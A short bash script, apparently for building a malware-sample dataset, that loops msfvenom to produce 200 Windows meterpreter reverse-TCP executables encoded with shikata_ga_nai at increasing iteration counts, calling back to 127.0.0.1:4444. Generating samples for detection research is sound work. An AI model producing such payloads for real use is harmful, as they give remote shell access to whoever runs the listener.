#!/bin/bash 
mkdir -p data/malicious/sgn # Create dir for malicious files

# loop to generate malicious code
for i in {1..200}; do
    echo "Generating SGN payload $i"
    # msfvenom command to generate a windows meterpreter reverse tcp payload which will conect back to the local machine on port 4444 and create different iterations using shikata_ga_nai encoder
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 \
        -e x86/shikata_ga_nai -i $i -f exe > "data/malicious/sgn/shikata_$i.exe" 2>/dev/null
    
    echo "shikata_$i.exe generated at $(date)" >> generation_log.txt
done
